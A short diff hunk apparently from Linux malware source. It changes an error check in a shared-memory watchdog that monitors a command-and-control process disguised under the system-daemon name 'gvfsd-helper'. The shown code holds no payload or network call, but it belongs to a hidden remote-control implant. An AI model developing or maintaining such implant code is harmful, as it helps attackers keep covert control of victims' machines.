@@ -475,7 +475,7 @@ void *watchdog_process_shmread() {
     do {
         // session bus runs this function to montior the main C2 process within gvfsd-helper.
         int shmid = shmget(0x64b2e2, 8, 0666);
-        if (shmid <= 0) {
+        if (shmid < 0) {
             #ifdef DEBUG
             fprintf(stderr, "\n[watchdog_process_shmread](%d) %s\n", getpid(), strerror(errno));
             #endif
